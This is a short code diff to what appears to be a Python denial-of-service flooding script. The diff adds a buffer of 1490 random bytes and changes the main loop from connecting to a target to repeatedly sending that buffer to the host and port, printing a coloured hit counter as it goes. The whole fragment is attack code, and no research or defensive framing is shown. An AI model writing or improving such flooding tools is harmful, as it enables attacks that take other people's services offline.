@@ -2,6 +2,9 @@ import socket
 import sys
 import threading
 import pystyle
+import random
+
+bytes = random._urandom(1490)
 
 writer = pystyle.Write.Print
 
@@ -57,7 +60,7 @@ def run(host, port):
     while True:
         ata += 1
         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect((host,port))
+        s.sendto(bytes, (host,port))
         writer("{:<20} {:<}".format(f"{host}:{port}", ata), pystyle.Colors.green_to_cyan, 0)
         print()
 
